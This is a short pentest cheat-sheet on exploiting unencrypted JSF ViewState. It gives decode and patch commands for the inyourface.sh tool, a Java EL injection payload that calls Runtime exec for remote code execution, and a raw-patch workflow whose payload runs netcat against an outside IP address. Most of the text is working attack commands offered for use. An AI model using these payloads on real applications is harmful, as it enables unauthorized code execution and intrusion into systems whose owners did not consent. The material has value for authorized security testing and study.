# JSF Viewstate

If the viewstate is not encrypted and interpreted on client side. It is possible to deserialize it and retrieve informations. Moreover, it is also possible to patch it in order to alter data value and in some specific case do remote code execution.

## Decode

```
$ ./inyourface.sh viewstate.txt > decoded.txt
```

## Patching the viewstate

```
$ ./inyourface.sh -patch 0x7e0040 userId 0 -outfile /tmp/patched.txt /tmp/viewstate.txt
```

For RCE search for: **org.apache.el.ValueExpressionImpl**

Here is a payload example: 

```
#{request.getClass().getClassLoader().loadClass(‘java.lang.
Runtime’).getDeclaredMethods()[6].invoke(null).exec(‘<cmd>’)
```

Then patch the viewstate:

```
./inyourface.sh -rawpatch 441 465 /tmp/payload.txt -outfile /tmp/patched.txt /tmp/viewstate.txt
```

## Rawpatch

Sometimes, the patching does not work correctly, then it is necessary to patch it manually.

First store the hex data to patch on a file:

```
$ echo -ne '\x4d\x00\x42\x23\x7b\x21\x73\x65\x73\x73\x69\x6f\x6e\x55\x74\x69\x6c\x69\x73\x61\x74\x65\x75\x72\x42\x65\x61\x6e\x2e\x69\x73\x50\x52\x4f\x20\x61\x6e\x64\x20\x21\x73\x65\x73\x73\x69\x6f\x6e\x55\x74\x69\x6c\x69\x73\x61\x74\x65\x75\x72\x42\x65\x61\x6e\x2e\x69\x73\x50\x41\x52\x7d\x00\x07\x62\x6f\x6f\x6c\x65\x61\x6e' > /tmp/blockdata.bin
```

Then specify the modified command, the file with the hex data to modify and the output file which will content the new hex data patched.

```
./patch_blockdata.py "#{\!sessionUtilisateurBean.isPRO and \!sessionUtilisateurBean.isPAR}" "#{request.getClass().getClassLoader().loadClass('java.lang.Runtime').getDeclaredMethods()[6].invoke(null).exec('nc 10.10.10.10 8000')}" blockdata.bin blockdata-patched.bin
```

Finally, launch the inyourface tool:

```
$ ./inyourface.sh -rawpatch 4109 4187 /tmp/blockdata-patched.bin -outfile /tmp/viewstate-patched.txt /tmp/viewstate.txt
```

## Links

https://www.synacktiv.com/ressources/MISC69_pentest_JSF.pdf

For trainings : https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles

Thanks to Renaud Dubourguais and Nicolas Collignon for the tools and their helps :D 